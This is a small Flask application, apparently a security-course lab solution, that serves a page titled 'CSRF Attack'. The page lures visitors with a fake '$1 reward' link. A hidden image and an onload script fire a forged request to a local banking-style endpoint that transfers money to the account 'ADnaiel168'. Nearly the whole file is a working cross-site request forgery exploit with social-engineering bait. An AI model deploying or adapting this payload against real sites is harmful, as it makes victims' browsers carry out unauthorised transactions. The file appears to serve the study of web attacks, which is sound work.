from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def start():
    # Redirect to the route where the CSRF attack is triggered
    return redirect('/Q2')

@app.route('/Q2')
def index():
    # This page will automatically trigger the CSRF attack
    return '''<!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>CSRF Attack</title>
            </head>
            <body>
                <h1>Click <a href="http://localhost:8020/loggedIn?username=ADnaiel168&moneyAmount=1">here</a> to claim your $1 reward!</h1>
                <!-- Embedding an image that triggers the CSRF attack automatically -->
                <img id="csrfImage" src="http://localhost:8020/loggedIn?username=ADnaiel168&moneyAmount=1" alt="Click me!" style="display:none;">
                <script>

                    // Function to trigger the CSRF attack when the page loads
                    window.onload = function() {
                        document.getElementById('csrfImage').src = "http://localhost:8020/loggedIn?username=ADnaiel168&moneyAmount=1";
                    };

                </script>
            </body>
            </html>'''

if __name__ == "__main__":
    app.run(debug=True)